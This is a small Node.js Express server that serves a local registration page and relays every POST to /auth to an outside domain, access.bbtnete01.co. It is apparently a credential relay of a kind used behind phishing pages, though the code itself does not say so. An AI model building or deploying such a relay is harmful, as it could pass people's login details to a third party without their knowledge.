const express = require('express');
const axios = require('axios');
const path = require('path');
const cors = require('cors');

const app = express();

// Middleware to parse JSON bodies
app.use(express.json());

// Enable CORS (optional, for cross-origin requests)
app.use(cors());

// Serve static files (e.g., register.html, logo.png, logo.gif) from the public folder
app.use(express.static(path.join(__dirname, 'public')));

// Handle POST requests to /auth
app.post('/auth', async (req, res) => {
    try {
        // Extract JSON data from the request body
        const data = req.body;

        // Forward the data to https://access.bbtnete01.co/user
        const response = await axios.post('https://access.bbtnete01.co/user', data, {
            headers: {
                'Content-Type': 'application/json',
            },
        });

        // Return the response from the external server
        res.status(response.status).json(response.data);
    } catch (error) {
        // Handle errors (e.g., network issues, invalid response)
        console.error('Error forwarding request:', error.message);
        res.status(error.response?.status || 500).json({
            error: 'Failed to process authentication request',
            details: error.message,
        });
    }
});

// Start the server on the Heroku-provided port or 5000 for local testing
const PORT = process.env.PORT || 5000;
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
